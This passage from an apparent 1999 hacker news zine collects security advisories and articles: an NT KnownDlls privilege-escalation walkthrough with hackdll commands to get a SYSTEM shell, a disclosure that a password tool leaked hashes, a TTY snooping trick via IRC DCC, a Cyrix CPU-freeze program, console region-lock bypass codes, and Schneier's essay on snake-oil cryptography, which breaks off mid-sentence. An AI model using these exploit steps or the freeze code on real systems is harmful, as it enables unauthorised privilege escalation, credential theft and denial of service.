+      group, even Administrators). But the system pr eloads this cache for you.
+      Permanent shared objects differ from regular shared objects only in the
+      fact that they have a flag set, and an incremented reference count, such
+      that if you create one, and then terminate the creating process or close
+      all handle s to the object, it does not disappear from the object space. 
+      
+              To exploit the poor permissions on this cache, one first needs to
+      delete one of the shared objects by name, in order to later replace it. So
+      we make a call to the NTDLL.DLL native function "OpenSection()", getting a
+      handle to the object. Then we call the
+      
+       NTOSKRNL.EXE native function "ZwMakeTemporaryObject()" which removes the
+      'permanent' flag and decrements the reference counter from the object. Now
+      we just call NTDLL.DLL:NtClose() on the handle and it is destroyed. 
+      
+              To create a section, one calls NTDLL.DLL:CreateSection(), which is
+      undocumented. There are other calls one needs to make in order to set up
+      the object and open the KnownDlls directory, but they are trivial and will
+      not be discussed here. Feel free to bro wse the source code presented at
+      the end of this advisory to see what you need to do though. Anyway, you
+      create a section (aka file-mapping) object that points to a trojan DLL. A
+      good candidate for DLL trojan is KERNEL32.DLL, since it is loaded by
+      pretty much every executable you're going to run.
+       
+              Note that any DLL cache objects you create as a user can not be
+      'permanent', hence, when you log out, the cache object _will_ disappear.
+      So how can we get a higher privelege process to run while we're logged in?
+      There are many ways. We can wait for an 'A t' job to go off, or we can set
+      up the DLL hack as an 'At' job that goes off when someone else is logged
+      in. But more reliable is this: 
+              
+              When a new Windows NT subsystem is started, it creates a subsystem
+      process to handle various system details. Examples of these processes are
+      LSASS.EXE and PSXSS.EXE. The PSXSS.EXE is the POSIX subsystem. But since
+      no one ever really uses the POSIX subsys tem under NT. So, chances are, it
+      won't be loaded into memory yet. Once it is, though, it's loaded until the
+      machine reboots. If it loaded, reboot the machine, and it won't be :P. 
+      
+              So, we launch our DLL cache hack, and then run a POSIX subsystem
+      command, thus launching PSXSS.EXE (which runs as 'NT AUTHORITY\SYSTEM',
+      the system account), and running our DLL with local administrator
+      privileges. Incidentally, other subsystems have the
+      
+       same effect, such as the OS/2 subsystem (the only other one that probably
+      isn't started yet). 
+      
+      --- 
+      Workarounds/Fixes:
+      ---
+              
+              I developed a patch for this security problem in the form of a
+      Win32 Service program that can be installed by the Administrator of the
+      system. It sets itself to run every time the system is started, and before
+      the user has the opportunity to start a program, it adjusts the
+      permissions of the DLL cache to something much safer. The source code for
+      t his service is also provided, along with a compiled version. Links to
+      the programs can be found at http://www.l0pht.com/advisories.html. 
+      
+              One can verify the validity of the patch by downloading the WinObj
+      v2.0 tool from System Internals (www.sysinternals.com) and inspecting the
+      permissions of the KnownDlls directory, and the section objects within it. 
+      
+              Microsoft has been sent a copy of this advisory, and I would
+      expect a hotfix from them at some point in the near future. 
+      
+      ---
+      Example :
+      ---
+      
+              I wrote up a trojan to test exploitability, and it was a simple
+      'forwarder' DLL that had the same exported names as KERNEL32.DLL, but a
+      different 'DllMain()' function, to be called when the DLL is loaded. The
+      function calls in my trojan, simply forward o ff to the real KERNEL32.DLL
+      calls located in a copy of the kernel that you make in 'REALKERN.DLL' in
+      the c:\temp directory. 
+      
+              To try out this vulnerability, obtain an account as a
+      low-privilege guest user (referred to as 'Dick') and do the following: 
+      
+              1. Log in as Dick at the console.
+              2. Start up two "cmd.exe" shells. Do the following in one of them.
+              3. Copy c:\winnt\system32\kernel32.dll to c:\temp\realkern.dll
+      (The egg dll is hard coded to use the c:\temp directory to find this file.
+      If you can't put it in c:\temp, then modify the source '.def' file to
+      point to a different location and recompile eggdll.dll)
+              4. Copy the provided hackdll.exe and eggdll.dll to c:\temp
+              5. Ensure that there is no file named c:\lockout. If there is,
+      delete it. The exploit uses this file as a lockfile. 
+              5. Delete the KERNEL32.DLL file-mapping object from the system cache:
+                 c:\> cd\temp
+                 c:\temp> hackdll -d kernel32.dll
+              6. Insert the new file-mapping object with:
+                 c:\temp> hackdll -a kernel32.dll c:\temp\eggdll.dll
+                 Don't hit a key in this window after hitting enter.
+              7. Now move to the other cmd.exe window that you started.
+              8. Run a POSIX subsystem command. A good way to start it is:
+                 c:\temp> posix /c calc
+                 (if you have calculator installed. If not, pick some other program)
+              9. Now the EGGDLL.DLL will prompt you with a few message boxes:
+                 Say no to the "User is DOMAIN\DICK, Spawn Shell?" box.
+                 Say no to the "User is \[garbage], Spawn Shell?" box.
+                 Say YES to the "User is NT AUTHORITY\SYSTEM, Spawn Shell?" box.
+                 Say YES to the "Winsta0" window station message box.
+                 Say YES to the "Desktop" window desktop message box.
+                 You will now see a "System Console" command.com shell open up.
+                 (saying yes to the next 'winlogon' box will give you something
+                  funny when you log out, btw :P)
+              10. Now go back to your first cmd.exe window and hit a key to
+                  unpoison the DLL cache.
+              11. In the System Console window, run the User Manager program,
+                  and modify Dick's account
+                  (or anyone else's for that matter) to your hearts content.
+                  (NT Server) c:\winnt\system32> usrmgr
+                  (NT Workstation) c:\winnt\system32> musrmgr
+      
+      ---
+      Source and Compiled Code:
+      ---
+      
+              Exploit code can be downloaded from L0pht's website at
+      http://www.l0pht.com/advisories.html. It is available in compiled form,
+      and in pure source form as two zipfiles. The L0pht patch for this advisory
+      is also available in both source form and compiled f orm from the same
+      URL. 
+      
+      
+      dildog@l0pht.com
+      ---------------
+      For more L0pht (that's L - zero - P - H - T) advisories check out:
+      http://www.l0pht.com/advisories.html
+      ---------------
+      
+      
+ 07.1 The l0pht's Quakenbush clearcase advisory
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+                          L0pht Security Advisory
+
+                       Advisory released Jan. 21, 1999
+           Application: Quakenbush Windows NT Password Appraiser
+
+              Severity: Users of the tool Password Appraiser
+                are unwittingly publishing NT user passwords to
+            the internet (even if your company is behind a firewall).
+
+                         Author: mudge@l0pht.com
+
+                   http://www.l0pht.com/advisories.html
+
+
+      
+      ---------
+      Overview :
+      ---------
+      
+        During an internal analysis of a tool which claimed to audit NT passwords
+        we noticed said tool sends users password hashes to a remote system
+        on the internet via HTTP. In addition to this, should the password
+        be known to the remote server, the plaintext equivalent is sent back
+        across the internet to the querying machine. What this means, in a nutshell,
+        is that if you are in any sort of organization connected to the internet -
+        behind a firewall or not* - and you run this program: You send all of 
+        your users passwords out through the internet. (* as long as you are 
+        permitting {users,employees} to surf the web) 
+      
+        This of course, makes the fact that you are trusting a third party with
+        your password information in the first place, a smaller concern by
+        comparison.
+      
+        Quakenbush is aware of this problem - yet there have been no statements 
+        that this will ever be fixed or addressed from them.
+      
+      -----------
+      Disclaimer :
+      -----------
+      
+        This is a touchy situation as the product in question can be viewed
+        as a competitor to the L0pht's own L0phtCrack 2.51 tool. As such, we
+        are going to do our best not to place any comparison on the two tools
+        functionality, performace specs, etc. in this advisory as this is not a
+        marketing blurb - but instead our regular service to the security 
+        community. 
+      
+        In all good consciousness we could not keep it a secret that anyone who
+        has run Password Appraiser has unwittingly exposed their private passwords. 
+        We hope that various government agencies that are connected to the network 
+        and run large NT installations were not bitten by this problem.
+      
+      ------------
+      Description :
+      ------------
+      
+        Password Appraiser is a tool that allows administrators to "Find accounts
+        with weak passwords" [1] on NT systems. In actuality what it does is
+        compare only the weaker LANMAN hash against a set of precomputed LANMAN
+        hashes for a table lookup to see if the password is "weak".
+      
+        The Demo version *only* allows one to run the program via quering across
+        the Internet. Other versions allow querying across the internet and/or
+        a local dictionary containing a smaller subset of words/hashes.
+      
+        We were checking the program out locally in our labs and at the same time
+        had taken a copy on an auditing gig of a large corporation ( >300,000 
+        systems with huge NT domains and PDC's). We were interested in how this
+        tool compared to L0phtcrack in real world situations.
+      
+        To see how the tool works we hooked up some network sniffers and
+        ran the demo version on one of our test machines in our local labs. 
+        Much to our surprise we watched the LANMAN hashes being sent IN THE CLEAR
+        to pw.quakenbush.com. For the passwords that the server had in its
+        dictionary a plaintext response was sent back. Our jaws dropped on the floor.
+      
+        A quick call to the l0pht member at the large corporation caught him
+        just in time to prevent the running of the program on the corporations
+        main PDC. A few seconds later and all >4000 users hashes (and any plaintext
+        responses) would have been sent out, through the firewall, and across the
+        internet.
+      
+        We know in the above situation that many of the users NT passwords were
+        also the passwords that they chose for various remote access methods. This
+        information could have been used to completely bypass the corporate firewall.
+        
+        So people realize that it is not just the plaintext responses that we are
+        so concerned about - we captured some of the hashes that Password Appraiser
+        could not crack and ran them through publicly available tools in brute 
+        force mode to recover the passwords. 
+      
+        It is important to mention that user names are not sent across the wire.
+        However, without the usernames the above threat is still quite real. The 
+        problem lies the known quantities: the location/site that sent the 
+        passwords, and the actual passwords.
+      
+        It is a trivial step to gather the usernames from this point forward. 
+      
+        [ Case examples: had the user accounts on our test machine been the 
+         actual 7 members of the l0pht it would have been trivial to find our 
+         e-mail names and try the passwords. With the large company, many of 
+         the passwords were the same and though they would not have been 
+         "cracked" by Password Appraiser, they were vulnerable to other tools
+         performing NT password analysis. Determining valid usernames to try 
+         with the recovered passwords is easily accomplished through enumeration
+         on sites such as www.four11.com, and whois databases to name a few 
+         resources.]
+      
+      
+      --------
+      Details :
+      --------
+      
+        Sniffing traffic to port 80 of pw.quakenbush.com shows the following 
+        information being exchanged:
+      
+        local client machine == [A]
+        remote dictionary server [pw.quakenbush.com] == [B]
+      
+        [
+         Example 1 - demonstrating vulnerability on Password Appraiser sending
+         LANMAN hash and plaintext equivalent from "weak" password
+        ] 
+      
+        [A] -> [B]
+         GET /default.asp?cid=[*]&v=3086&pw=D85774CF671A9947AAD3B435B51404EE HTTP/1.1
+         Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+         User-Agent: Microsoft URL Control - 6.00.8169
+         Host: pw.quakenbush.com
+      
+        [*] Note - the cid is the verification mechanism so the server can 
+            austensibly check that the client is indeed paid for. The number that
+            was removed was the evaluation number that was automatically sent
+            upon downloading the software. Its value is unimportant for this
+            advisory.
+      
+        [B] -> [A]
+         HTTP/1.1 200 OK
+         Server: Microsoft-IIS/4.0
+         Date: Wed, 20 Jan 1999 23:51:14 GMT
+         Content-Type: text/html
+         Cache-control: private
+         Transfer-Encoding: chunked
+      
+         12
+         ::PW::FOOBAR::PW::
+         0
+      
+         From this, one can see that password appraiser only works on the deprecated
+         LANMAN hash which is, in this case : D85774CF671A9947AAD3B435B51404EE
+      
+         The response shows that the password being checked was FOOBAR (case
+         sensitivity is unknown as the program does not look at the NTLM hash).
+      
+         The above can be witnessed during any stage in transit to the quakenbush
+         server. The attacker now has the password.
+        
+        [
+         Example 2 - demonstrating vulnerability on Password Appraiser sending
+         LANMAN hash of a "strong" password
+        ] 
+      
+      
+        [A] -> [B]
+      
+         GET /default.asp?cid=[*]&v=3086&pw=8F4272A6Fc6FDFDFAAD3B435B51404EE HTTP/1.1
+         Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+         User-Agent: Microsoft URL Control - 6.00.8169
+         Host: pw.quakenbush.com
+      
+        [B] -> [A]
+      
+         HTTP/1.1 200 OK
+         Server: Microsoft-IIS/4.0
+         Date: Thu, 21 Jan 1999 00:09:03 GMT
+         Content-Type: text/html
+         Cache-control: private
+         Transfer-Encoding: chunked
+      
+         19
+         ::PW::<not cracked>::PW::
+         0
+      
+         Here, the LANMAN hash is : 8F4272A6FC6FDFDFAAD3B435B51404EE. We see from
+         the response from Password Appraiser that it believes this password
+         to be secure. Unfortunately, people sniffing the network who plug this
+         hash into other tools take advantage of the weak design behind LANMAN [2]
+         and retrieve the password of 'BOGUS!!' in under 1 minute.
+      
+      -----------
+      Conclusion :
+      -----------
+      
+        There are several good aspects to the Password Appraiser tool. 
+        Unfortunately they appear to be in the non-security critical components. 
+      
+        The notion of sending such priveleged information [internal user 
+        passwords and hashes] across the public networks is problematic. If
+        there is no attempt at encryption then the attack is kindergarden level.
+        If there is some sort of encrypted sleeve (ie an SSL session) then
+        the attack is elevated a level but still possible as anyone can spoof
+        as the server and harvest password hashes. Certificates would raise the
+        bar even further but the problem of end-node security comes into play.
+      
+        One has to trust that the pw.quakenbush.com server is more secure than
+        their corporate firewall or other protective measures. While in many 
+        cases this might be true - there are undoubtedly cases where it is not.
+        In these cases, since one has handed critical security information about 
+        internal systems, the overal security is lowered due to the weakest link.
+        
+        The only way we saw to avoid this problem was to enable the end user to
+        be completely self contained and not reliant upon external sources for
+        cracking passwords.
+      
+        The moniker "Who has the keys to your business [3]" takes on an entire
+        new light given the vulnerabilities in this advisory.
+      
+      mudge@l0pht.com
+      ---------------
+      For more L0pht (that's L - zero - P - H - T) advisories check out:
+      http://www.l0pht.com/advisories.html
+      ---------------
+      
+      
+      References:
+      --
+      [1] quoted from Quakenbush web page at http://www.quakenbush.com/default.htm
+      
+      [2] information on some LANMAN hash weaknesses and other tools can be found
+          at http://www.l0pht.com
+      
+      [3] "Who has the keys to your business" - Main slogan on 
+          http://www.quakenbush.com     
+      
+      @HWA
+
+
+ 07.2 Hackers Get Their Final Fantasy
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   
+     The hacker community didn't
+     waste any time on tweaking
+     modded systems to work with Square's new RPG.
+
+     February 12, 1999 
+
+     Within the time it takes to blink, restless hackers and code busters
+     figured out how to bypass the Japanese version of Square's Final Fantasy
+     VIII lockout mechanism, according to several sources that contacted
+     IGNPSX today.
+
+     Prior to today, owners of modified PlayStations who bought an imported
+     Japanese version of FFVIII found that the tamper-sensitive game would
+     not play on their systems, in an attempt to prevent exporters and other
+     like-minded folk from playing it outside of Japan.
+
+     However, within less than a day, Asian companies have found a solution
+     to this apparently minor technical obstacle. A chip is available for
+     PlayStations with older systems and newer systems, and National
+     Console Support (www.ncsx.com) is retailing the chips for $78. These
+     will be available by Monday, February 12, according to NCS.
+
+     Another solution has also been found, this one for Gameshark owners.
+     For those who own Game Shark v2.0, several variations of code are
+     available.
+
+     D009B182 0000
+     8009B182 2402
+
+     For use with any Magic Key or Pro Action Replay to boot FFVIII:
+
+     D009B1B8 6D09
+     8009B1B 8000
+
+     Here's a variant of the code:
+
+     D009B1B A002
+     B009B1B A000
+
+     For the record, IGNPSX does not in any way promote piracy of games
+     or tampering of your system. After all, modding your PlayStation will
+     void your warranty. We do, however, like to promote great games. For
+     those of you able to purchase an import version of Final Fantasy VIII --
+     and willing to forego one of the biggest aspects of the game, the story --
+     then we do recommend purchasing the import version. Similarly, we also
+     recommend waiting for the North American version when it arrives this
+     fall -- the IGNPSX staff.
+
+     @HWA
+
+
+     
+     
+ 08.0 dcc yerself some r00t
+      ~~~~~~~~~~~~~~~~~~~~~      
+      
+      [ http://www.rootshell.com/ ]
+      
+      Date: Wed, 10 Feb 1999 14:24:55 -0800 (PST)
+      From: Gregory Taylor <jest@ados.com>
+      To: info@rootshell.com
+      Subject: Re: New Exploit - DCCsnoop.txt
+      
+      Discovered by Gregory Taylor
+      Febuary 5th, 1999
+      
+      It is possible to snoop a user's Linux connection through IRC..
+      
+      DCC Sending the device files /dev/ttyp1 - ? while someone is logged in on
+      that ttyp to an outside client will send all information sent from that user
+      to the target client, making it possible to snoop his connection, password
+      and login
+      
+      The drawback is the user will not see his own information typed in and may
+      disconnect, but for those with auto-login scripts, it is possible to recieve
+      login/passwords, and even /dev/tty1 - etc. can be snooped for those logging
+      in as root.. I would like some feedback on anyone who may have any ideas or
+      comments about this.
+      
+      
+      Gregory Taylor
+      UNIX Systems Engineer
+      American Digital Online Services
+      
+      ---------------------------------------------------------------------------
+      - (877) ADOS.COM -- http://www.ados.com -- jest@ados.com ------------------
+      ---------------------------------------------------------------------------
+         
+ 09.0  Cyrix bug crashes cpus
+       ~~~~~~~~~~~~~~~~~~~~~~
+            
+     Approved-By: aleph1@UNDERGROUND.ORG
+     X-Homepage: http://personal.redestb.es/ragnar
+     Date: 	Thu, 4 Feb 1999 16:50:21 +0100
+     Reply-To: Ragnar Hojland Espinosa <tech.support@REDESTB.ES>
+     Sender: Bugtraq List <BUGTRAQ@netspace.org>
+     From: Ragnar Hojland Espinosa <tech.support@REDESTB.ES>
+     Subject:      Cyrix bug: freeze in hell, badboy
+     To: BUGTRAQ@netspace.org
+     
+     I emailed Cyrix a few months ago, and even managed to get a "oh, we will
+     look at it" thanks to Rafael Reilova, but that was it till today.  A
+     couple of people did report it, effectively, froze (most of) their Cyrix
+     CPUs while running the opcodes below as non priviledged user.
+     
+     While I don't have the enough knowledge to assure this _is_ a CPU bug, it
+     certainly looks like one to me (NO_LOCK isn't a workaround, btw).
+     
+     0x804a368 <the_data>:   cwtl
+     0x804a36a <the_data+2>: orl    $0xe6ebe020,%eax
+     0x804a36f <the_data+7>: jle    0x804a368 <the_data>
+     
+     Here is the code (tested with linux, any version):
+     
+     /* Please compile without optimizations */
+     unsigned char the_data[] = { 62, 152, 13, 32, 224, 235, 230, 126, 247 };
+     
+     void (*badboy)();
+     int main (int argc, char **argv)
+     {
+        badboy = (void(*)())(the_data);
+        asm ("movl badboy,%eax");
+        asm ("call *%eax");
+     
+        return 0;
+     }
+     
+     If you try it, please send me your /proc/{cpuinfo,version} and if it
+     freezes or not.
+     --
+     ____/|  Ragnar Hojland  (ragnar@lightside.ddns.org)      Fingerprint  94C4B
+     \ o.O|                                                   2F0D27DE025BE2302C
+     =(_)=  "Thou shalt not follow the NULL pointer for      104B78C56 B72F0822
+        U     chaos and madness await thee at its end."       hkp://keys.pgp.com
+     
+     
+ 10.0  Intel's big brother id chips on the new Pentium III's
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+        
+       *******************************************************************    
+       ***      /join #HWA.hax0r.news on EFnet the key is `zwen'       ***
+       *******************************************************************
+       
+     
+        "The lawyers at Intel won't say it's foolproof but it is as foolproof 
+          as it can get."
+                          - Computer Associates vice-president J.P. Corriveau,
+                           on Intel's hardware security scheme for Pentium III's
+  
+        
+
+       Chipping Away at Your Privacy 
+       News Opinion Contributed by Justin Hill
+       http://www.ntsecurity.net/scripts/loader.asp?iD=/news/whatprivacy.htm
+
+       An excerpt:
+       
+       "If having a retrievable serial number on your processor bugs you, then 
+      you'll sleep better knowing that a lot of hackers and crackers on the 
+      planet are going to be playing around with ways to prove just how easy it
+      will be to steal your personal serial number without your knowledge -- 
+      doh! But on the flip side, if it's even remotely possible, they'll attempt
+      to make software that can spoof the processor serial number when it's 
+      requested, so if your a privacy fanatic, you'll probably want to get a copy
+      of that program if and when it appears - heh."
+      
+      Yes I think he's right ... and another short excerpt:
+
+      "And if that's not a big enough dent to your already-almost-nonexistent-
+      privacy, then you'll probably want to puke up your pizza when you learn that
+      at least three states, South Carolina, Florida, and Colorado, have all made 
+      a rather thoughtless deal with a private business firm so that the firm may 
+      purchase some 22 million driver's license  photos of private state citizens.
+      That's right people, your governors were clinically brain dead that day, and
+      now your picture might fall into the hands of whoever calls the shots at that
+      private company -- all this and more for only pennies a photo. But wait, it 
+      gets even worse ;-]"
+  
+  
+      Check out the whole article its an interesting read, 
+      http://www.ntsecurity.net/scripts/loader.asp?iD=/news/whatprivacy.htm
+                * scooped from HNN (where else? krist those guys work hard ...)
+
+ 11.0 Security Snake Oil
+      ~~~~~~~~~~~~~~~~~~
+      
+      Snake Oil
+      
+      
+      
+      The problem with bad security is that it looks just like good security.
+      You can't tell the difference by looking at the finished product.  Both
+      make the same security claims; both have the same functionality.  Both
+      might even use the same algorithms: triple-DES, 1024-bit RSA, etc.   Both
+      might use the same protocols, implement the same standards, and have been
+      endorsed by the same industry groups.  Yet one is secure and the other is
+      insecure.
+      
+      Many cryptographers have likened this situation to the pharmaceutical
+      industry before regulation.  The parallels are many: vendors can make any
+      claims they want, consumers don't have the expertise to judge the accuracy
+      of those claims, and there's no real liability on the part of the vendors
+      (read the license you agree to when you buy a software security product).
+      
+      This is not to say that there are no good cryptography products on the
+      market. There are.  There are vendors that try to create good products and
+      to be honest in their advertising.  And there are vendors that believe they
+      have good products when they don't, but they're just not skilled enough to
+      tell the difference.  And there are vendors that are just out to make a
+      quick buck, and honestly don't care if their product is good or not.
+      
+      Most products seem to fall into the middle category: well-meaning but
+      insecure.  I've talked about the reason in previous CRYPTO-GRAM essays, but
+      I'll summarize: anyone can create a cryptography product that he himself
+      cannot break.  This means that a well-meaning person comes up with a new
+      idea, or at least an idea that he has never heard of, cannot break it, and
+      believes that he just discovered the magic elixir to cure all security
+      problems.  And even if there's no magic elixir, the difficulty of creating
+      secure products combined with the ease of making mistakes makes bad
+      cryptography the rule.
+      
+      The term we use for bad cryptography products is "snake oil," which was the
+      turn-of-the-century American term for quack medicine.  It brings to mind
+      traveling medicine shows, and hawkers selling their special magic elixir
+      that would cure any ailment you could imagine.
+      
+      For example, here is a paragraph from the most recent snake-oil
+      advertisement I received in e-mail: "Encryptor 4.0 uses a unique in-house
+      developed incremental base shift algorithm.  Decryption is practically
+      
+impossible, even if someone manages to reverse engineer our program to
+      obtain the algorithm, the decryption of a file depends on the exact
+      password (encryption key).  Even if someone is guessing the encryption key
+      the file will only be decrypted correctly if the encryption key is 100
+      percent correct.  See the IMPORTANT WARNING on our Web site
+      
+http://ten4.com/encryptor."  I checked the Web site; the odds that this
+      product is any good are negligible.
+      
+      Elsewhere I've talked about building strong security products, using
+      tried-and-true mathematics, and generally being conservative.  Here I want
+      to talk about some of the common snake-oil warning signs, and how you can
+      pre-judge products from their advertising claims.  These warning signs are
+      not foolproof, but they're pretty good.
+      
+      Warning Sign #1: Pseudo-mathematical gobbledygook.  
+      
+      In the quote above, notice the "unique in-house developed incremental base
+      shift algorithm."  Does anyone have any idea what that means?  Are there
+      any academic papers that discuss this concept?  Long noun chains don't
+      automatically imply security.
+      
+      Meganet <http://www.meganet.com> has a beauty on their Web site: "The base
+      of VME is a Virtual Matrix, a matrix of binary values which is infinity in
+      size in theory and therefore have no redundant value.  The data to be
+      encrypted is compared to the data in the Virtual Matrix.  Once a match is
+      found, a set of pointers that indicate how to navigate inside the Virtual
+      Matrix is created.  That set of pointers (which is worthless unless
+      pointing to the right Virtual Matrix) is then further encrypted in dozens
+      other algorithms in different stages to create an avalanche effect. The
+      result is an encrypted file that even if decrypted is completely
+      meaningless since the decrypted data is not the actual data but rather a
+      set of pointers.  Considering that each session of VME has a unique
+      different Virtual Matrix and that the data pattern within the Virtual
+      Matrix is completely random and non-redundant, there is no way to derive
+      the data out of the pointer set."  This makes no sense, even to an expert.
+      
+      US Data Security <http://www.usdsi.com> has another beauty: "From a
+      mathematical point of view, the TTM algorithm is intuitively natural and
+      less cumbersome to use than methods that are number-theory based."
+      SuperKrypt <http://www.superkrypt.com/> tries to impress with an acronym:
+      "SuperKrypt products utilize the DNGT bulk encryption method," whatever
+      that is.  And Cennoid <http://www.cennoid.com> just doesn't understand what
+      it's talking about: "Since key length and key structure vary and since the
+      encryption engine does not use any mathematical algorithms, reverse
+      engineering is impossible and guessing is not an option."
+      
+      The point here is that, like medicine, cryptography is a science.  It has a
+      body of knowledge, and researchers are constantly improving that body of
+      knowledge: designing new security methods, breaking existing security
+      methods, building theoretical foundations, etc.  Someone who obviously does
+      not speak the language of cryptography is not conversant with the
+      literature, and is much less likely to have invented something good.  It's
+      
+as if your doctor started talking about "energy waves and healing
+      vibrations."  You'd worry.
+      
+      Warning Sign #2: New mathematics.
+      
+      Every couple of years, some mathematician looks over at cryptography, says
+      something like, "oh, that's easy," and proceeds to create an encryption
+      algorithm out of whatever he has been working on.  Invariably it is lousy.  
+      
+      Beware cryptography based on new paradigms or new areas of mathematics:
+      chaos theory, neural networks, coding theory, zeta functions.  Cryptography
+      is hard; the odds that someone without any experience in the field can
+      revolutionize it are small.  And if someone does, let the academic
+      community have a few years to understand it before buying products based on
+      it.
+      
+      Warning Sign #3: Proprietary cryptography.
+      
+      I promise not to start another tirade about the problems of proprietary
+      cryptography.  I just include it here as a warning sign.  So when a company
+      like GenioUSA <http://www.geniousa.com/genio/> refuses to divulge what
+      algorithm they're using (they claim it's "world class secret key
+      encryption," whatever that means), you should think twice before using
+      their product (it's completely broken, by the way).
+      
+      Another company, Crypt-o-Text <http://www.savard.com/crypt-o-text/>,
+      promises a "complex proprietary encryption algorithm" and that "there is
+      absolutely no way to determine what password was used by examining the
+      encrypted text."  It was completely broken in an InfoWorld review.
+      
+      This kind of thing isn't exclusive to small companies.  Axent once tried to
+      pass XOR off as a real encryption algorithm.  It wasn't until some peeked
+      inside the compiled code that we discovered it.
+      
+      Any company that won't discuss its algorithms or protocols has something to
+      hide.  There's no other possible reason.  (And don't let them tell you that
+      it is patent-pending; as soon as they file the patent, they can discuss the
+      technology.  If they're still working on the patent, tell them to come back
+      after they can make their technology public.)
+      
+      Warning Sign #4: Extreme cluelessness.
+      
+      Some companies make such weird claims that it's obvious that they don't
+      understand the field.  TriStrata says this about their encryption
+      algorithm:  "Since TriStrata's encryption scheme is so simple and of such
+      low computational complexity, the client portion can reside on a wide range
+      of systems -- from a server to a portable PC."  Don't they realize that
+      every encryption algorithm is small enough to fit on a portable PC, that
+      DES and RSA and SHA can fit on an 8-bit smart card, and that you can
+      implement some of the AES candidates in 17 clock cycles per byte or a few
+      thousand gates?
+      
+      GenioUSA talks about why they don't use public-key cryptography in their
+      product): "Public Key encryption is exactly that, you are not the only
+      party involved in the generation, integrity, and security of all the
+      keys/passwords used to encrypt your e-mail, documents, and files.  Public
+      key encryption is great technology to use to exchange things with anyone
+      you won't trust with your secret key(s) and/or can't exchange secret key(s)
+      with.  We quote one sentence from a well known Web page, 'All known public
+      
+key cryptosystems, however, are subject to shortcut attacks and must
+      therefore use keys ten or more times the lengths of those discussed here to
+      achieve the an [sic] equivalent level of security.'"  So what?  This
+      company just doesn't get it.
+      
+      Warning Sign #5: Ridiculous key lengths.
+      
+      Jaws Technology <http://www.jawstech.com> boasts: "Thanks to the JAWS L5
+      algorithm's statistically unbreakable 4096 bit key, the safety of your most
+      valued data files is ensured."  Meganet takes the ridiculous a step further
+      <http://www.meganet.com>: "1 million bit symmetric keys -- The market
+      offer's [sic] 40-160 bit only!!"
+      
+      Longer key lengths are better, but only up to a point.  AES will have
+      128-bit, 192-bit, and 256-bit key lengths.  This is far longer than needed
+      for the foreseeable future.  In fact, we cannot even imagine a world where
+      256-bit brute force searches are possible.  It requires some fundamental
+      breakthroughs in physics and our understanding of the universe.  For
+      public-key cryptography, 2048-bit keys have same sort of property; longer
+      is meaningless.
+      
+      Think of this as a sub-example of Warning Sign #4: if the company doesn't
+      understand keys, do you really want them to design your security product?
+      
+      Warning Sign #6: One-time pads.
+      
+      One-time pads don't make sense for mass-market encryption products.  They
+      may work in pencil-and-paper spy scenarios, they may work on the
+      U.S.-Russia teletype hotline, but they don't work for you.  Most companies
+      that claim they have a one-time pad actually do not.  They have something
+      they think is a one-time pad.  A true one-time pad is provably secure
+      (against certain attacks), but is also unusable.
+      
+      Elementrix, now defunct, announced a one-time pad product a few years ago,
+      and refused to recant when it was shown that it was no such thing.  Ciphile
+      Software <http://www.ciphile.com> just tries to pretend: "Original Absolute
+      Privacy - Level3 is an automated pseudo one-time pad generator with very
+      sophisticated and powerful augmenting features."  Whatever that means.
+      
+      More recently, TriStrata <http://www.tristrata.com> jumped on the world's
+      cryptography stage by announcing that they had a one-time pad.  Since then,
+      they've been thoroughly trounced by anyone with a grain of cryptographic
+      sense and have deleted the phrase from their Web site.  At least they've
+      exhibited learning behavior.
+      
+      Ultimate Privacy <http://www.ultimateprivacy.com> might actually use a
+      one-time pad (although they claim to use Blowfish, too, which worries me):
+      "The one time pad is a private key method of encryption, and requires the
+      safe and secure distribution of the pad material, which serves as the key
+      in our solution.  The security of the key distribution comes down to how
+      secure you want to be -- for communicating point-to-point with one other
+      person, we suggest a face-to-face hand-off of the pad material."  Remember
+      that you need to hand off the same volume of bits as the message you want
+      to send, otherwise you don't have a one-time pad anymore.
+      
+      Warning Sign #7: Unsubstantiated claims.
+      
+      Jaws Technologies says this about its new encryption technology: "This
+      scientifically acclaimed encryption product is the world's strongest
+      
+commercially available software of its kind."  Acclaimed by who?  The Web
+      site doesn't say.  World's strongest by what comparison?  Nothing.
+      
+      UBE98, at <http://www.parkie.ndirect.co.uk/>, stands for "unbreakable
+      encryption," or at least it did before someone took a day to break it.  Its
+      Web site makes the same sort of ridiculous claims:  "One of the Strongest
+      Encryptions available in the UK in a program that everyone will understand
+      how to use!"  Wow.  SenCrypt <http://www.ionmarketing.com/> is advertised
+      to be "the most secure cryptographic algorithm known to mankind."  Double wow.
+      
+      Some companies claim "military-grade" security.  This is a meaningless
+      term.  There's no such standard.  And at least in the U.S., military
+      cryptography is not available for non-government purposes (although
+      government contractors can get it for classified contracts).
+      
+      Other companies make claims about other algorithms that are "broken,"
+      without giving details.  Or that public-key cryptography is useless.  Don't
+      believe any of this stuff.  If the claim seems far-fetched, it probably is.
+      If a company claims that their products have been reviewed by
+      cryptographers, ask for names.  Ask for a copy of the review.  Counterpane
+      Systems reviews many products, and our clients can give out the reviews if
+      they choose.
+      
+      Warning Sign #8: Security proofs.
+      
+      There are two kinds of snake-oil proofs.  The first are real mathematical
+      proofs that don't say anything about real security.  The second are fake
+      proofs.  Meganet claims to have a proof that their VME algorithm is as
+      secure as a one-time pad.  Their "proof" is to explain how a one-time pad
+      works, add the magic spell "VME has the same phenomenon behavior patterns,
+      hence proves to be equally strong and unbreakable as OTP," and then give
+      the results of some statistical tests.  This is not a proof.  It isn't even
+      close.
+      
+      More subtle are actual provably secure systems.  They do exist.  Last
+      summer, IBM made a big press splash about their provably secure system,
+      which they claimed would revolutionize the cryptography landscape.  (See
+      <http://www.counterpane.com/crypto-gram-9809.html#cramer-shoup> for a
+      discussion.)  Since then, the system has disappeared.  It's great research,
+      but mathematical proofs have little to do with actual product security.
+      
+      Warning Sign #9: Cracking contests.
+      
+      I wrote about this at length last December:
+      <http://www.counterpane.com/crypto-gram-9812.html#contests>.  For now,
+      suffice it to say that cracking contests are no guarantee of security, and
+      often mean that the designers don't understand what it means to show that a
